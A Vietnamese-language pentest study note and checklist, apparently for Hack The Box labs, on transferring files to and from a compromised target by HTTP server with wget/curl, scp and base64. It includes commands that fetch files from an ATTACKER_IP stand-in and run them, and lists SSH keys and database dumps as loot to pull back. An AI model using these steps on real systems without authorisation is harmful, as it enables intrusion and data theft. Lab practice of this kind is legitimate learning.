# Transferring Files

## Ý chính

Trong pentest, sau khi có shell/RCE trên target, ta thường cần chuyển file:

Upload lên target:
- enum scripts: `linpeas.sh`, `linenum.sh`
- exploit/payload
- web shell
- binary helper

Download từ target về attacker:
- config files
- database dump
- backup files
- SSH keys
- logs

Nếu có Meterpreter thì dùng:

```text
upload
download
```

Nếu chỉ có reverse shell thường, cần dùng các cách thủ công.

---

## Cách 1: Python HTTP Server + wget/curl

Trên máy attacker, vào thư mục chứa file cần chuyển:

```bash
cd /tmp
python3 -m http.server 8000
```

Trên target, tải bằng `wget`:

```bash
wget http://ATTACKER_IP:8000/linenum.sh
```

Nếu không có `wget`, dùng `curl`:

```bash
curl http://ATTACKER_IP:8000/linenum.sh -o linenum.sh
```

Trong HTB, `ATTACKER_IP` thường là IP của `tun0`.

Lấy IP:

```bash
ip a
```

---

## Cách 2: SCP

Dùng khi có SSH credential.

Upload file lên target:

```bash
scp linenum.sh user@remotehost:/tmp/linenum.sh
```

Nếu SSH dùng port custom:

```bash
scp -P PORT linenum.sh user@remotehost:/tmp/linenum.sh
```

Download file từ target về attacker:

```bash
scp user@remotehost:/tmp/file.txt .
```

Với port custom:

```bash
scp -P PORT user@remotehost:/tmp/file.txt .
```

---

## Cách 3: Base64

Dùng khi không thể transfer trực tiếp bằng HTTP/SCP.

Trên attacker, encode file:

```bash
base64 shell -w 0
```

Copy chuỗi base64.

Trên target, decode:

```bash
echo '<BASE64_STRING>' | base64 -d > shell
```

Nếu là binary cần chạy:

```bash
chmod +x shell
```

---

## Validate file transfer

Kiểm tra loại file:

```bash
file shell
```

Kiểm tra hash trên attacker:

```bash
md5sum shell
```

Kiểm tra hash trên target:

```bash
md5sum shell
```

Nếu hash giống nhau, file đã transfer đúng.

---

## Khi nào dùng cách nào?

| Tình huống | Cách nên dùng |
|---|---|
| Target có `wget` hoặc `curl`, outbound được phép | Python HTTP server |
| Có SSH credential | SCP |
| Không có network transfer, chỉ paste được text | Base64 |
| Có Meterpreter | `upload` / `download` |
| File lớn | SCP hoặc HTTP |
| File nhỏ | Base64 cũng được |-

---
# Checklist: File Transfer Lab

## A. Xác định hướng transfer

- [ ] Cần upload file lên target hay download file về attacker?
- [ ] Target có shell không?
- [ ] Target có `wget` không?

```bash
which wget
```

- [ ] Target có `curl` không?

```bash
which curl
```

- [ ] Target có `python3` không?

```bash
which python3
```

- [ ] Có SSH credential không?
- [ ] Firewall có chặn outbound/inbound không?

```
Có wget/curl và target connect được tới attacker
→ Python HTTP server

Có SSH credential
→ SCP

Không có network transfer, chỉ có copy/paste shell
→ Base64

Cần kiểm tra file có lỗi không
→ file + md5sum
```

---

## B. Upload bằng Python HTTP Server

Trên attacker:

```bash
cd /path/to/file
python3 -m http.server 8000
```

Lấy IP attacker:

```bash
ip a
```

Trong HTB, dùng IP `tun0`.

Trên target:

```bash
cd /tmp
wget http://ATTACKER_IP:8000/file
```

Hoặc:

```bash
cd /tmp
curl http://ATTACKER_IP:8000/file -o file
```

Kiểm tra:

```bash
ls -la file
file file
```

Nếu cần chạy:

```bash
chmod +x file
./file
```

---

## C. Upload bằng SCP

Có SSH credential:

```bash
scp file user@TARGET_IP:/tmp/file
```

Nếu SSH port custom:

```bash
scp -P PORT file user@TARGET_IP:/tmp/file
```

Kiểm tra trên target:

```bash
ls -la /tmp/file
```

---

## D. Download từ target bằng SCP

```bash
scp user@TARGET_IP:/path/to/remote/file .
```

Nếu SSH port custom:

```bash
scp -P PORT user@TARGET_IP:/path/to/remote/file .
```

---

## E. Transfer bằng Base64

Trên attacker:

```bash
base64 file -w 0
```

Copy output.

Trên target:

```bash
echo '<BASE64_STRING>' | base64 -d > file
```

Validate:

```bash
file file
md5sum file
```

Nếu binary:

```bash
chmod +x file
```

---

## F. Validate integrity

Trên attacker:

```bash
md5sum file
```

Trên target:

```bash
md5sum file
```

- [ ] Hash giống nhau chưa?
- [ ] File type đúng chưa?

```bash
file file
```

---

## G. Troubleshooting

Nếu target không tải được từ attacker:

- [ ] Sai IP attacker? Kiểm tra `tun0`
- [ ] Sai port HTTP server?
- [ ] Python server có đang chạy không?
- [ ] Target có outbound đến attacker không?
- [ ] Firewall có chặn không?
- [ ] Dùng `curl` thay `wget`
- [ ] Dùng `base64` nếu network transfer bị chặn
- [ ] Dùng `scp` nếu có SSH credential

Nếu `scp` lỗi:

- [ ] Có dùng đúng port không? `scp` dùng `-P`, không phải `-p`
- [ ] Có đúng username/password/key không?
- [ ] Đường dẫn remote có writable không?